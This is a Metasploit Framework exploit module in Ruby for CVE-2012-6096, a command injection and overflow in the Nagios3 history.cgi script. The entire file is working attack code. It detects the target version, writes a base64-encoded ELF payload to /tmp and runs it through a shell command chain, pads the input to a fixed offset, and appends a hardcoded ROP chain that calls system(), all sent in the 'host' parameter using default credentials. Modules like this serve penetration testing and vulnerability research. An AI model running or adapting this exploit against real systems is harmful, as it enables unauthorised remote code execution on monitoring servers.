##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
require 'rex'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Nagios3 history.cgi Host Command Execution',
            'Description'    => %q{
                    This module abuses a command injection vulnerability in the
                Nagios3 history.cgi script.
            },
            'Author'         => [
                'Unknown <temp66@gmail.com>',         # Original finding
                'blasty <blasty@fail0verflow.com>',       # First working exploit
                'Jose Selvi <jselvi@pentester.es>',       # Metasploit module
                'Daniele Martini <cyrax[at]pkcrew.org>'   # Metasploit module
            ],
            'License'        => MSF_LICENSE,
            'References'     =>
                [
                    [ 'CVE', '2012-6096' ],
                    [ 'OSVDB', '88322' ],
                    [ 'BID', '56879' ],
                    [ 'EDB', '24084' ],
                    [ 'URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2012-December/089125.html' ]
                ],
            'Platform'       => ['unix', 'linux'],
            'Arch'           => [ ARCH_X86 ],
            'Privileged'     => false,
            'Payload'        =>
                {
                    'Space'       => 200,    # Due to a system() parameter length limitation
                    'BadChars'    => '', # It'll be base64 encoded
                },
            'Targets'        =>
                [
                    [ 'Automatic Target', { 'auto' => true }],
                    # NOTE: All addresses are from the history.cgi binary
                    [ 'Appliance Nagios XI 2012R1.3 (CentOS 6.x)',
                        {
                            'BannerRE' => 'Apache/2.2.15 (CentOS)',
                            'VersionRE' => '3.4.1',
                            'Arch' => ARCH_X86,
                            'Offset' => 0xc43,
                            'RopStack' =>
                                [
                                    0x0804c260, # unescape_cgi_input()
                                    0x08048f04, # pop, ret
                                    0x08079b60, # buffer addr
                                    0x08048bb0, # system()
                                    0x08048e70, # exit()
                                    0x08079b60  # buffer addr
                                ]
                        }
                    ],
                    [ 'Debian 5 (nagios3_3.0.6-4~lenny2_i386.deb)',
                        {
                            'BannerRE' => 'Apache/2.2.9 (Debian)',
                            'VersionRE' => '3.0.6',
                            'Arch' => ARCH_X86,
                            'Offset' => 0xc37,
                            'RopStack' =>
                                [
                                    0x0804b620, # unescape_cgi_input()
                                    0x08048fe4, # pop, ret
                                    0x080727a0, # buffer addr
                                    0x08048c7c, # system()
                                    0xdeafbabe, # if should be exit() but it's not
                                    0x080727a0  # buffer addr
                                ]
                        }
                    ],
                ],
            'DefaultTarget'  => 0,
            'DisclosureDate' => 'Dec 09 2012'))
 
        register_options(
            [
                OptString.new('TARGETURI', [true, "The full URI path to history.cgi", "/nagios3/cgi-bin/history.cgi"]),
                OptString.new('USER', [false, "The username to authenticate with", "nagiosadmin"]),
                OptString.new('PASS', [false, "The password to authenticate with", "nagiosadmin"]),
            ], self.class)
    end
 
    def detect_version(uri)
        # Send request
        res = send_request_cgi({
            'method'    => 'GET',
            'uri'       => uri,
            'headers'   => { 'Authorization' => 'Basic ' + Rex::Text.encode_base64("#{datastore['USER']}:#{datastore['PASS']}") },
        }, 10)
 
        # Error handling
        if res.nil?
            print_error("Unable to get a response from the server")
            return nil, nil
        end
        if(res.code == 401)
            print_error("Please specify correct values for USER and PASS")
            return nil, nil
        end
        if(res.code == 404)
            print_error("Please specify the correct path to history.cgi in the URI parameter")
            return nil, nil
        end
 
        # Extract banner from response
        banner = res.headers['Server']
 
        # Extract version from body
        version = nil
        version_line = res.body.match(/Nagios&reg; (Core&trade; )?[0-9.]+ -/)
        if not version_line.nil?
            version = version_line[0].match(/[0-9.]+/)[0]
        end
 
        # Check in an alert exists
        alert = res.body.match(/ALERT/)
 
        return version, banner, alert
    end
 
    def select_target(version, banner)
 
        # No banner and version, no target
        if banner.nil? or version.nil?
            return nil
        end
 
        # Get version information
        print_status("Web Server banner: #{banner}")
        print_status("Nagios version detected: #{version}")
 
        # Try regex for each target
        self.targets.each do |t|
            if t['BannerRE'].nil? or t['VersionRE'].nil?  # It doesn't exist in Auto Target
                next
            end
            regexp1 = Regexp.escape(t['BannerRE'])
            regexp2 = Regexp.escape(t['VersionRE'])
            if ( banner =~ /#{regexp1}/ and version =~ /#{regexp2}/ ) then
                return t
            end
        end
        # If not detected, return nil
        return nil
    end
 
    def check
        print_status("Checking banner and version...")
        # Detect version
        banner, version, alert = detect_version(target_uri.path)
        # Select target
        mytarget = select_target(banner, version)
 
        if mytarget.nil?
            print_error("No matching target")
            return CheckCode::Unknown
        end
 
        if alert.nil?
            print_error("At least one ALERT is needed in order to exploit")
            return CheckCode::Detected
        end
 
        return CheckCode::Vulnerable
    end
 
    def exploit
        # Automatic Targeting
        mytarget = nil
        banner, version, alert = detect_version(target_uri.path)
        if (target['auto'])
            print_status("Automatically detecting the target...")
            mytarget = select_target(banner, version)
            if mytarget.nil?
                fail_with(Exploit::Failure::NoTarget, "No matching target")
            end
        else
            mytarget = target
        end
 
        print_status("Selected Target: #{mytarget.name}")
        if alert.nil?
            print_error("At least one ALERT is needed in order to exploit, none found in the first page, trying anyway...")
        end
        print_status("Sending request to http://#{rhost}:#{rport}#{target_uri.path}")
 
        # Generate a payload ELF to execute
        elfbin = generate_payload_exe
        elfb64 = Rex::Text.encode_base64(elfbin)
 
        # Generate random filename
        tempfile = '/tmp/' + rand_text_alphanumeric(10)
 
        # Generate command-line execution
        if mytarget.name =~ /CentOS/
            cmd = "echo #{elfb64}|base64 -d|tee #{tempfile};chmod 700 #{tempfile};rm -rf #{tempfile}|#{tempfile};"
        else
            cmd = "echo #{elfb64}|base64 -d|tee #{tempfile} |chmod +x #{tempfile};#{tempfile};rm -f #{tempfile}"
        end
        host_value = cmd.gsub!(' ', '${IFS}')
 
        # Generate 'host' parameter value
        padding_size = mytarget['Offset'] - host_value.length
        host_value << rand_text_alphanumeric( padding_size )
 
        # Generate ROP
        host_value << mytarget['RopStack'].pack('V*')
 
        # Send exploit
        res = send_request_cgi({
            'method'    => 'GET',
            'uri'       => target_uri.path,
            'headers'   => { 'Authorization' => 'Basic ' + Rex::Text.encode_base64("#{datastore['USER']}:#{datastore['PASS']}") },
            'vars_get' =>
            {
                'host' => host_value
            }
        })
 
        if not res
            if session_created?
                print_status("Session created, enjoy!")
            else
                print_error("No response from the server")
            end
            return
        end
 
        if res.code == 401
            fail_with(Exploit::Failure::NoAccess, "Please specify correct values for USER and PASS")
        end
 
        if res.code == 404
            fail_with(Exploit::Failure::NotFound, "Please specify the correct path to history.cgi in the TARGETURI parameter")
        end
 
        print_status("Unknown response #{res.code}")
    end
 
end
